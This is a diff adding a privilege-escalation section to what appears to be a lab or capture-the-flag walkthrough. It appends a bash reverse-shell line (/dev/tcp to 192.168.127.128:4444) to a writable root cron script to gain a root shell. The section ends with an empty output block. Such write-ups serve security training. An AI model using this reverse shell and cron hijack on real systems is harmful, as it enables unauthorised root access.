@@ -135,6 +135,60 @@ uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:
 
 yes we got the shell.
 
+## 4.Privilege Escalation
+
+Check crontab file :
+
+```bash
+bash-4.2$ cat /etc/crontab
+
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
+```
+
+the file `CleaningScript.sh` is writable by user `jenkins` so just add the following line to the file :
+
+```bash
+bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
+```
+
+content of the file :
+
+```bash
+bash-4.2$ cat /etc/script/CleaningScript.sh
+#!/bin/bash
+
+rm -rf /var/log/httpd/access_log.txt
+bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
+```
+
+and wait for the shell after 5 minutes :
+
+```bash
+
+```
+
+
+
+
+
+
+
+
+
 
 
 
